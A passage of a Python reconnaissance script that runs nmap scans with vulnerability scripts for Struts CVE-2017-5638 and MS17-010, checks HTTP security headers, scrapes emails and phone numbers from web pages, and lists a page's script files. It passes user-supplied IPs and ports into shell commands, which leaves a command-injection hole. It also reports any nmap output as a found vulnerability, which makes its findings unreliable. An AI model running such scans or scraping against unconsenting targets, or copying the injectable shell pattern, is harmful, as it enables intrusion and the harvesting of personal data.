        result = subprocess.check_output(command, shell=True, text=True)
        print_colored(result, Fore.CYAN)
    except subprocess.CalledProcessError as e:
        print_colored(f"Error with port scanning: {e}", Fore.RED)

# فحص المنافذ للبحث عن الثغرات
def scan_ports_for_vulnerabilities(ip):
    while True:
        choice = input(Fore.MAGENTA + "Do you want to specify the number of ports to scan for vulnerabilities? (Yes/y or No/n) : " + Style.RESET_ALL).strip().lower()
        if choice in ['yes', 'y']:
            try:
                max_ports = int(input(Fore.YELLOW + "Enter the number of ports to scan for vulnerabilities (e.g., 300): " + Style.RESET_ALL))
                port_range = f'1-{max_ports}'
                break
            except ValueError:
                print_colored("Please enter a valid number.", Fore.RED)
        elif choice in ['no', 'n']:
            port_range = '1-65535'
            break
        else:
            print_colored("Wrong choice 🚫 Please choose a valid option.", Fore.RED)

    print_colored("The scan may take from 1 to 5 minutes. Please wait...", Fore.YELLOW)
    command = f"nmap -T5 -sV -p {port_range} --script http-vuln-cve2017-5638,ssl-enum-ciphers {ip}"

    try:
        result = subprocess.check_output(command, shell=True, text=True)
        print_colored(result, Fore.CYAN)
    except subprocess.CalledProcessError as e:
        print_colored(f"Error with port scanning: {e}", Fore.RED)

# التحقق من الثغرات باستخدام سكربتات محددة لكل منفذ
def check_vulnerabilities(ip, port):
    scripts = [
        'http-vuln-cve2017-5638',
        'ssl-enum-ciphers',
        'http-security-headers',
        'smb-vuln-ms17-010'
    ]
    
    vulnerabilities_found = False
    for script in scripts:
        command = f"nmap -p {port} --script={script} {ip}"
        try:
            print_colored(f"Checking vulnerabilities on port {port} with script: {script}...", Fore.YELLOW)
            result = subprocess.check_output(command, shell=True, text=True)
            if result:
                print_colored(f"Vulnerability found with {script}: {result}", Fore.GREEN)
                vulnerabilities_found = True
            else:
                print_colored(f"No vulnerabilities found with script: {script}", Fore.RED)
        except subprocess.CalledProcessError as e:
            print_colored(f"Error checking vulnerabilities: {e}", Fore.RED)

    if not vulnerabilities_found:
        print_colored(f"No vulnerabilities found on port {port} after checking all scripts.", Fore.LIGHTYELLOW_EX)

# دالة لفحص الرؤوس الأمنية الأساسية
def check_security_headers(headers):
    print_colored("Checking security headers...", Fore.CYAN)

    # قائمة برؤوس الأمان الشائعة
    security_headers = {
        "Content-Security-Policy": "Content Security Policy",
        "Strict-Transport-Security": "Strict Transport Security",
        "X-Content-Type-Options": "X Content Type Options",
        "X-Frame-Options": "X Frame Options",
        "X-XSS-Protection": "X XSS Protection"
    }

    # فحص كل رأس من رؤوس الأمان
    for header, description in security_headers.items():
        if header in headers:
            print_colored(f"{description} is present: {headers[header]}", Fore.GREEN)
        else:
            print_colored(f"{description} is missing!", Fore.RED)



# دالة لاستخراج عناوين البريد الإلكتروني وأرقام الهواتف
def extract_emails_and_phones(url):
    try:
        response = requests.get(url)
        content = response.text

        # البحث عن عناوين البريد الإلكتروني باستخدام تعبيرات نمطية متقدمة
        emails = re.findall(r"[a-zA-Z0-9._%+-]+@(gmail\.com|yahoo\.com|hotmail\.com|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", content)
        
        # البحث عن أرقام الهواتف بتنسيق دولي أو محلي (تأكد من وجود 8 إلى 15 رقمًا فقط)
        phones = re.findall(r"\+?\d{1,3}[-.\s]?\(?\d{2,4}?\)?[-.\s]?\d{3,4}[-.\s]?\d{3,4}[-.\s]?\d{0,4}", content)
        
        # تصفية الأرقام بحيث تكون ضمن نطاق معين للطول للتحقق من صحتها
        valid_phones = [phone for phone in phones if 8 <= len(re.sub(r'\D', '', phone)) <= 15]

        # طباعة عناوين البريد الإلكتروني إن وجدت
        if emails:
            print_colored("Email Addresses Found:", Fore.GREEN)
            for email in emails:
                print_colored(email, Fore.LIGHTCYAN_EX)
        else:
            print_colored("No Email Addresses Found", Fore.RED)

        # طباعة أرقام الهواتف إن وجدت
        if valid_phones:
            print_colored("Phone Numbers Found:", Fore.GREEN)
            for phone in valid_phones:
                print_colored(phone, Fore.LIGHTCYAN_EX)
        else:
            print_colored("No Phone Numbers Found", Fore.RED)

    except Exception as e:
        print_colored(f"Error extracting emails and phones: {e}", Fore.RED)

        

# تحليل ملفات JavaScript
def analyze_js(url):
    soup = BeautifulSoup(requests.get(url).text, 'html.parser')
    js_files = [script.get('src') for script in soup.find_all('script') if script.get('src')]
    print_colored(f"JavaScript files : {js_files}", Fore.MAGENTA)

# العودة إلى القائمة الرئيسية أو إيقاف الأداة
def return_to_menu():
    print_colored("\n Do you want to :", Fore.CYAN)
    print("1. Return to the checklist")
    print("2. Terminate the program")
    
    while True:
        choice = input(Fore.YELLOW + "Choose an option: " + Style.RESET_ALL)
        if choice == "1":
            main_menu()
            break
        elif choice == "2":
            print_colored("Thank you for using the tool ❤️", Fore.CYAN)
            exit()
        else:
            print_colored("Incorrect choice 🚫 Please choose a valid option.", Fore.RED)

# تشغيل القائمة الرئيسية
if __name__ == "__main__":
    main_menu()